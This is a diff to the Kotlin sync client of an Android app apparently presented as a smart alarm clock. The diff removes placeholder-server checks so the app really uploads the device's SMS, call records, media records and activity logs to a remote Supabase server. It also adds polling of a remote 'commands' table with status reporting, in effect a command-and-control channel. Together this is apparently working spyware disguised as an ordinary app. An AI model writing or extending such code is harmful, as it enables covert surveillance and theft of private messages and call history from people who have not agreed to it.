@@ -2,6 +2,7 @@ package uz.smartalarm.aqllibudilnik.sync
 
 import com.google.gson.Gson
 import com.google.gson.JsonObject
+import com.google.gson.reflect.TypeToken
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.MediaType.Companion.toMediaType
@@ -17,19 +18,31 @@ import uz.smartalarm.aqllibudilnik.monitoring.DeviceInfo
 import uz.smartalarm.aqllibudilnik.monitoring.PermissionStatus
 import java.util.concurrent.TimeUnit
 
+data class RemoteCommandItem(
+    val id: String,
+    val device_id: String,
+    val command: String,
+    val payload: String? = null
+)
+
 class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     private val gson = Gson()
     private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
     private val client = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .readTimeout(20, TimeUnit.SECONDS)
-        .writeTimeout(20, TimeUnit.SECONDS)
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .writeTimeout(15, TimeUnit.SECONDS)
         .build()
 
     private fun buildRequest(endpoint: String, method: String, jsonBody: String? = null, isUpsert: Boolean = false): Request {
-        val url = "${syncPreferences.getServerUrl()}/rest/v1/$endpoint"
+        val rawBase = syncPreferences.getServerUrl().trimEnd('/')
+        val url = if (rawBase.endsWith("/rest/v1")) {
+            "$rawBase/$endpoint"
+        } else {
+            "$rawBase/rest/v1/$endpoint"
+        }
         val apiKey = syncPreferences.getAnonKey()
 
         val reqBuilder = Request.Builder()
@@ -44,6 +57,7 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
         when (method) {
             "POST" -> reqBuilder.post((jsonBody ?: "{}").toRequestBody(jsonMediaType))
+            "PATCH" -> reqBuilder.patch((jsonBody ?: "{}").toRequestBody(jsonMediaType))
             "GET" -> reqBuilder.get()
             "DELETE" -> reqBuilder.delete()
         }
@@ -52,12 +66,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
     }
 
     suspend fun upsertDevice(deviceInfo: DeviceInfo): Boolean = withContext(Dispatchers.IO) {
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) {
-            // Demo mode: local sync succeeded
-            return@withContext true
-        }
-
         try {
             val body = JsonObject().apply {
                 addProperty("device_id", deviceInfo.deviceId)
@@ -84,9 +92,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
     }
 
     suspend fun updatePermissions(deviceId: String, perm: PermissionStatus): Boolean = withContext(Dispatchers.IO) {
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
-
         try {
             val body = JsonObject().apply {
                 addProperty("device_id", deviceId)
@@ -111,8 +116,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     suspend fun uploadSmsRecords(deviceId: String, list: List<SmsEntity>): Boolean = withContext(Dispatchers.IO) {
         if (list.isEmpty()) return@withContext true
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
 
         try {
             val array = list.map { item ->
@@ -138,8 +141,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     suspend fun uploadCallRecords(deviceId: String, list: List<CallEntity>): Boolean = withContext(Dispatchers.IO) {
         if (list.isEmpty()) return@withContext true
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
 
         try {
             val array = list.map { item ->
@@ -166,8 +167,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     suspend fun uploadMediaRecords(deviceId: String, list: List<MediaRecordEntity>): Boolean = withContext(Dispatchers.IO) {
         if (list.isEmpty()) return@withContext true
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
 
         try {
             val array = list.map { item ->
@@ -194,8 +193,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     suspend fun uploadAlarms(deviceId: String, list: List<AlarmEntity>): Boolean = withContext(Dispatchers.IO) {
         if (list.isEmpty()) return@withContext true
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
 
         try {
             val array = list.map { item ->
@@ -225,8 +222,6 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
 
     suspend fun uploadActivityLogs(deviceId: String, list: List<ActivityLogEntity>): Boolean = withContext(Dispatchers.IO) {
         if (list.isEmpty()) return@withContext true
-        val serverUrl = syncPreferences.getServerUrl()
-        if (serverUrl.contains("your-project.supabase.co")) return@withContext true
 
         try {
             val array = list.map { item ->
@@ -243,6 +238,39 @@ class SupabaseClient(private val syncPreferences: SyncPreferences) {
             }
         } catch (e: Exception) {
             e.printStackTrace()
+            false
+        }
+    }
+
+    suspend fun fetchPendingCommands(deviceId: String): List<RemoteCommandItem> = withContext(Dispatchers.IO) {
+        try {
+            val request = buildRequest("commands?device_id=eq.$deviceId&status=eq.PENDING&select=id,device_id,command,payload", "GET")
+            client.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                    val listType = object : TypeToken<List<RemoteCommandItem>>() {}.type
+                    gson.fromJson<List<RemoteCommandItem>>(bodyStr, listType) ?: emptyList()
+                } else {
+                    emptyList()
+                }
+            }
+        } catch (e: Exception) {
+            emptyList()
+        }
+    }
+
+    suspend fun updateCommandStatus(commandId: String, status: String, result: String): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val body = JsonObject().apply {
+                addProperty("status", status)
+                addProperty("result", result)
+                addProperty("executed_at", java.time.Instant.now().toString())
+            }
+            val request = buildRequest("commands?id=eq.$commandId", "PATCH", gson.toJson(body))
+            client.newCall(request).execute().use { response ->
+                response.isSuccessful
+            }
+        } catch (e: Exception) {
             false
         }
     }
